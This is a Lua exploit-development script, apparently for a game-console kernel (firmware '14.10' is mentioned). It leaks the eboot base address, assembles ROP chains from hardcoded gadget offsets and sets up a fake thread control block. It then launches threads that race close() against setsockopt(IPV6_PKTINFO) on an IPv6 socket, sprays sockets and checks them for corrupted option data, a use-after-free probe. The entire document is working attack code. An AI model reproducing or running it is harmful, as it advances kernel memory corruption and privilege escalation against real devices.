-- CRASH_CLASS: HIGH
-- PROBE 1401e: IPv6 pktopts close/setsockopt race
--
-- prior art: 1401d hung (getcontext=421 returns -1 on 14.10),
--   396f proven child pattern: fn_addr stub + memory.alloc stack,
--   384b fake TCB fix, 1400a PKTINFO baseline OK

print("=== PROBE 1401e: IPv6 PKTOPTS RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) memory.write_dword(a, v) end
local function wq2(addr, hi, lo)
    wd(addr, lo); wd(addr + 4, hi)
end
local function get_hi_lo(v)
    if type(v) == "table" and v.h then return v.h, v.l end
    return 0, N(v)
end
local function add_off(hi, lo, off)
    lo = lo + off
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return hi, lo
end

local sc_socket     = mk(97)
local sc_close      = mk(6)
local sc_setsockopt = mk(105)
local sc_getsockopt = mk(118)
local sc_socketpair = mk(135)
local sc_read       = mk(3)
local sc_nanosleep  = mk(240)

local AF_INET6 = 28
local SOCK_DGRAM = 2
local IPPROTO_IPV6 = 41
local IPV6_PKTINFO = 46
local IPPROTO_UDP = 17

-- Get eboot
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
print(string.format("eboot=0x%X%08X", eb_hi, eb_lo))

-- Gadgets (all verified in earlier probes)
local g = {}
local function gadget(name, off)
    local hi, lo = add_off(eb_hi, eb_lo, off)
    g[name] = {hi, lo}
end
gadget("pop_rax", 0x992)
gadget("pop_rdi", 0xC9DFE)
gadget("pop_rsi", 0xD77D)
gadget("pop_rdx", 0x3B02D7)
gadget("pop_rcx", 0xE64)
gadget("pop_r8",  0x991)

-- fn_addr stub
local stub = N(syscall.pipe.fn_addr)
local stub_hi = math.floor(stub / 0x100000000)
local stub_lo = stub % 0x100000000
print(string.format("stub=0x%X%08X", stub_hi, stub_lo))

-- Shared fake TCB
local tcb = memory.alloc(0x1000)
local tcb_n = N(tcb)
local tcb_hi, tcb_lo = get_hi_lo(tcb)
for i = 0, 0x1000 - 4, 4 do
    wd(tcb_n + i, (i % 8 == 0) and tcb_lo or tcb_hi)
end
local tcb_ptr = memory.alloc(8)
wq2(N(tcb_ptr), tcb_hi, tcb_lo)
local tp_hi, tp_lo = get_hi_lo(tcb_ptr)

-- ============================================================
-- Phase 0: quick child test
-- ============================================================
print("")
print("--- child test ---")
local STACK_SZ = 0x10000
local CHAIN_BASE = 0xE000

local function launch_child(chain)
    local stk = memory.alloc(STACK_SZ)
    local sn = N(stk)
    for i = 0, STACK_SZ - 4, 4 do wd(sn + i, 0) end

    local rsp = sn + CHAIN_BASE
    rsp = (math.floor(rsp / 16) * 16) - 8

    for i, entry in ipairs(chain) do
        local off = (i - 1) * 8
        wd(rsp + off, entry[2])
        wd(rsp + off + 4, entry[1])
    end

    local param = memory.alloc(0x40)
    local pn = N(param)
    wq2(pn + 0x00, g.pop_rax[1], g.pop_rax[2])
    wq2(pn + 0x08, 0, 0)
    wq2(pn + 0x10, get_hi_lo(stk))
    wq2(pn + 0x18, 0, CHAIN_BASE)
    wq2(pn + 0x20, 0, 0)
    wq2(pn + 0x28, 0, 0)
    local ctid = memory.alloc(8)
    wq2(pn + 0x30, get_hi_lo(ctid))

    local ok_t, rv_t = pcall(function()
        return mk(455)(uint64(pn), uint64(0x38))
    end)
    if not ok_t then return -1 end
    return N(rv_t)
end

-- Test: sysarch + write(sp_w, marker) + thr_exit
local spb = memory.alloc(16)
local spr = N(sc_socketpair(uint64(1), uint64(SOCK_DGRAM), uint64(0), uint64(spb)))
local sp_r = rd(N(spb)) or -1
local sp_w = rd(N(spb) + 4) or -1
print(string.format("sp=%d fds=%d,%d", spr, sp_r, sp_w))

local mark = memory.alloc(16)
wq2(N(mark), 0xCAFE, 0xBABE)
local mk_hi, mk_lo = get_hi_lo(mark)

local chain_t = {
    g.pop_rdi, {0, 129}, g.pop_rsi, {tp_hi, tp_lo},
    g.pop_rax, {0, 165}, {stub_hi, stub_lo},
    g.pop_rdi, {0, sp_w}, g.pop_rsi, {mk_hi, mk_lo}, g.pop_rdx, {0, 8},
    g.pop_rax, {0, 4}, {stub_hi, stub_lo},
    g.pop_rdi, {0, 0}, g.pop_rax, {0, 431}, {stub_hi, stub_lo},
}
local tr = launch_child(chain_t)
print("thr_new=" .. tr)

-- Wait
local slp = memory.alloc(16)
wq2(N(slp), 0, 0); wd(N(slp) + 8, 50000000)
sc_nanosleep(uint64(N(slp)), uint64(0))

local rbuf = memory.alloc(16); wq2(N(rbuf), 0, 0)
local rr = N(sc_read(uint64(sp_r), uint64(N(rbuf)), uint64(8)))
local rh, rl = get_hi_lo(rq(N(rbuf)))
print(string.format("read=%d data=0x%X%08X", rr, rh, rl))
sc_close(uint64(sp_r)); sc_close(uint64(sp_w))

if rh ~= 0xCAFE or rl ~= 0xBABE then
    print("CHILD FAIL"); return
end
print("CHILD OK!")

-- ============================================================
-- Phase 1: PKTINFO baseline
-- ============================================================
print("")
print("--- PKTINFO baseline ---")
local tfd = N(sc_socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP)))
local pkt = memory.alloc(32)
wq2(N(pkt), 0, 0); wq2(N(pkt) + 8, 0, 0); wd(N(pkt) + 16, 0)
local r = N(sc_setsockopt(uint64(tfd), uint64(IPPROTO_IPV6), uint64(IPV6_PKTINFO), uint64(N(pkt)), uint64(20)))
print("setsockopt(PKTINFO)=" .. r)
sc_close(uint64(tfd))
if r ~= 0 then print("FAIL"); return end

-- ============================================================
-- Phase 2: Race
-- ============================================================
print("")
print("--- race ---")

local ROUNDS = 8
local CLOSE_N = 60
local SETOPT_N = 60
local SPRAY = 25
local anomalies = 0
local pkt_n = N(pkt)

for round = 1, ROUNDS do
    local fd = N(sc_socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP)))
    if fd < 0 then print("[R" .. round .. "] socket fail"); break end
    wq2(pkt_n, 0, 0); wq2(pkt_n+8, 0, 0); wd(pkt_n+16, 0)
    sc_setsockopt(uint64(fd), uint64(IPPROTO_IPV6), uint64(IPV6_PKTINFO), uint64(pkt_n), uint64(20))

    -- Child A: sysarch + close(fd) x N + thr_exit
    local ca = {
        g.pop_rdi, {0, 129}, g.pop_rsi, {tp_hi, tp_lo},
        g.pop_rax, {0, 165}, {stub_hi, stub_lo},
    }
    for i = 1, CLOSE_N do
        ca[#ca+1] = g.pop_rdi; ca[#ca+1] = {0, fd}
        ca[#ca+1] = g.pop_rax; ca[#ca+1] = {0, 6}
        ca[#ca+1] = {stub_hi, stub_lo}
    end
    ca[#ca+1] = g.pop_rdi; ca[#ca+1] = {0, 0}
    ca[#ca+1] = g.pop_rax; ca[#ca+1] = {0, 431}
    ca[#ca+1] = {stub_hi, stub_lo}

    -- Child B: sysarch + setsockopt(fd, PKTINFO) x N + thr_exit
    local ob = memory.alloc(32)
    wq2(N(ob), 0, 0); wq2(N(ob)+8, 0, 0); wd(N(ob)+16, 0)
    local obh, obl = get_hi_lo(ob)

    local cb = {
        g.pop_rdi, {0, 129}, g.pop_rsi, {tp_hi, tp_lo},
        g.pop_rax, {0, 165}, {stub_hi, stub_lo},
    }
    for i = 1, SETOPT_N do
        cb[#cb+1] = g.pop_rdi; cb[#cb+1] = {0, fd}
        cb[#cb+1] = g.pop_rsi; cb[#cb+1] = {0, IPPROTO_IPV6}
        cb[#cb+1] = g.pop_rdx; cb[#cb+1] = {0, IPV6_PKTINFO}
        cb[#cb+1] = g.pop_rcx; cb[#cb+1] = {obh, obl}
        cb[#cb+1] = g.pop_r8;  cb[#cb+1] = {0, 20}
        cb[#cb+1] = g.pop_rax; cb[#cb+1] = {0, 105}
        cb[#cb+1] = {stub_hi, stub_lo}
    end
    cb[#cb+1] = g.pop_rdi; cb[#cb+1] = {0, 0}
    cb[#cb+1] = g.pop_rax; cb[#cb+1] = {0, 431}
    cb[#cb+1] = {stub_hi, stub_lo}

    if round == 1 then
        print(string.format("chain_a=%d chain_b=%d entries", #ca, #cb))
    end

    local ra = launch_child(ca)
    local rb = launch_child(cb)

    -- Spray
    local sps = {}
    for i = 1, SPRAY do
        local sfd = N(sc_socket(uint64(AF_INET6), uint64(SOCK_DGRAM), uint64(IPPROTO_UDP)))
        if sfd >= 0 then
            wq2(pkt_n, 0, 0); wq2(pkt_n+8, 0, 0); wd(pkt_n+16, 0)
            sc_setsockopt(uint64(sfd), uint64(IPPROTO_IPV6), uint64(IPV6_PKTINFO), uint64(pkt_n), uint64(20))
            sps[#sps+1] = sfd
        end
    end

    -- Wait
    wq2(N(slp), 0, 0); wd(N(slp)+8, 80000000)
    sc_nanosleep(uint64(N(slp)), uint64(0))

    -- Check
    for i, sfd in ipairs(sps) do
        local out = memory.alloc(32)
        local on = N(out)
        wq2(on, 0, 0); wq2(on+8, 0, 0); wq2(on+16, 0, 0)
        local olen = memory.alloc(8)
        wd(N(olen), 24)
        local gr = N(sc_getsockopt(uint64(sfd), uint64(IPPROTO_IPV6),
            uint64(IPV6_PKTINFO), uint64(on), uint64(N(olen))))
        if gr == 0 then
            local q1h, q1l = get_hi_lo(rq(on) or uint64(0))
            local q2h, q2l = get_hi_lo(rq(on+8) or uint64(0))
            local d5 = rd(on+16) or 0
            if q1l ~= 0 or q1h ~= 0 or q2l ~= 0 or q2h ~= 0 or d5 ~= 0 then
                anomalies = anomalies + 1
                print(string.format("[R%d] ANOMALY fd=%d: 0x%X%08X 0x%X%08X idx=0x%X",
                    round, sfd, q1h, q1l, q2h, q2l, d5))
            end
        end
    end
    for _, sfd in ipairs(sps) do sc_close(uint64(sfd)) end

    print(string.format("[R%d] thr=%d/%d spray=%d anom=%d", round, ra, rb, #sps, anomalies))
end

print("")
print(string.format("=== RESULTS: %d rounds, %d anomalies ===", ROUNDS, anomalies))
print("=== PROBE 1401e COMPLETE ===")
